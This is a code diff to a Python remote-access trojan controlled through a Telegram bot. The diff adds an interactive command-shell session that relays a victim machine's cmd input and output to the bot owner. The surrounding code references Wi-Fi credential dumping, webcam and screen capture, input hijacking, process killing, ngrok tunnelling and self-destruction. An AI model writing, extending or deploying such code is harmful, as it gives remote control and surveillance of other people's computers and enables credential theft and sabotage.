@@ -8,7 +8,7 @@ If you lose control of your telegram bot, you could potentially lose the control
 """
 
 
-__version__ = "2.16"
+__version__ = "2.17"
 
 
 #TELEGRAM
@@ -305,6 +305,7 @@ terminateprocess - Kills a process by name.
 procmonmenu - Shows procmon menu.
 procmonadd - Adds a process to the process monitor list.
 procmonrem - Removes a process to the process monitor list.
+cmdsession - Enters a local cmd session.
 
 🎮 Input / Device Control
 randomkeyboard - Sets all user's input to random characters.
@@ -813,7 +814,7 @@ class PeppinoTelegram:
         self.token = token
         self.owner_id = owner_id
         self.ngrok_token = ngrok_token
-        self.can_use_ngrok = bool(ngrok_token.strip())
+        self.can_use_ngrok = bool(ngrok_token)
         if self.can_use_ngrok:
             self.tunnelhandler = TunnelManager()
 
@@ -853,7 +854,9 @@ class PeppinoTelegram:
         self.mainmenu_ref = None
         self.wifidumper = WifiDumper()
         self.all_session_messages: list[int] = []
+
         self.cmd_session = CMDSession()
+        self.cmd_session_active: bool = False
 
         LOADING_STATUS_MESSAGE = self.new_editable_message("Loading functions")#TODO Update user
 
@@ -891,6 +894,7 @@ class PeppinoTelegram:
             "help":lambda: self.bsend(self.help),
             "invertedscreen":self.inverted_screen,
             "johnporknoaudio":self.johnporknoaudio,
+            "cmdsession":self.cmdsession,
             "planktonnoaudio":self.planktonnoaudio,
             "distortedscreen":self.distorted_screen,
             "displaymode":self.display_mode,
@@ -899,7 +903,6 @@ class PeppinoTelegram:
             "deleteallmessages":self.deleteallmessages,
             "getip":self.getip,
             "mouselock":self.mouselock,
-            #"keyboardlock":self.keyboardlock,
             "fullclip":self.record_webcam_and_screen,
             "selfdestruction":self.selfdestruction,
             "duckyhelp":lambda: self.bsend(self.duckyhelp),
@@ -1014,34 +1017,37 @@ class PeppinoTelegram:
         except Exception as e:
             return self.bsend(text, retries+1)
 
+    """
+.oooooo.   ooo        ooooo oooooooooo.    .oooooo..o                              o8o
+d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                              `"'
+888           888b     d'888   888      888 Y88bo.       .ooooo.   .oooo.o  .oooo.o oooo   .ooooo.  ooo. .oo.
+888           8 Y88. .P  888   888      888  `"Y8888o.  d88' `88b d88(  "8 d88(  "8 `888  d88' `88b `888P"Y88b
+888           8  `888'   888   888      888      `"Y88b 888ooo888 `"Y88b.  `"Y88b.   888  888   888  888   888
+`88b    ooo   8    Y     888   888     d88' oo     .d8P 888    .o o.  )88b o.  )88b  888  888   888  888   888
+`Y8bood8P'  o8o        o888o o888bood8P'   8""88888P'  `Y8bod8P' 8""888P' 8""888P' o888o `Y8bod8P' o888o o888o
+    """
     def cmdsession(self) -> None:
         """Interactive CMD session via Telegram."""
+        if self.cmd_session_active:
+            return
+        self.cmd_session_active = True
         self.bsend("💻 CMD session started. Type 'exit' to quit.")
-        while True:
-            command = self.send_prompt("CMD> ")
-            if command.strip().lower() == "exit":
-                self.cmd_session.exit()
-                self.bsend("💻 CMD session closed.")
-                break
-            self.cmd_session.write_input(command)
-            output_lines = []
-
-            # Collect both stdout and stderr
-            for line in self.cmd_session.cmd_session.stdout:
-                if not line.strip():
-                    break
-                output_lines.append(line)
-            for line in self.cmd_session.cmd_session.stderr:
-                if not line.strip():
-                    break
-                output_lines.append(line)
-
-            # Send result or a placeholder if empty
-            if output_lines:
-                self.bsend("".join(output_lines))
+        # checks if X(the output) is relevant and not composed only by newlines or spaces
+        self.cmd_session.run_output_reader_thread(
+            lambda x: self.bsend(f"\n{x}") if x.strip().replace(" ", "") else lambda: x,
+            lambda x: self.bsend(f"\n{x}") if x.strip().replace(" ", "") else lambda: x
+        )
+        sleep(1)
+        while 1:
+            sleep(.5)
+            command = self.send_prompt("ENTER A COMMAND: ")
+            if command != "exit":
+                self.cmd_session.write_input(command)
             else:
-                self.bsend("(no output)")
-
+                self.bsend("💻 CMD session stopped.")
+                self.cmd_session.stop_output_readed_thread()
+                self.cmd_session_active = False
+                break
 
     def cantopen(self, process: str) -> None:
         self.cantopenlist.append(process)
@@ -1476,6 +1482,7 @@ class PeppinoTelegram:
             "📊 Procmonmenu": "/procmonmenu",
             "➕ Procmonadd": "/procmonadd",
             "➖ Procmonrem": "/procmonrem",
+            "</> CMDSession": "/cmdsession"
         }
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
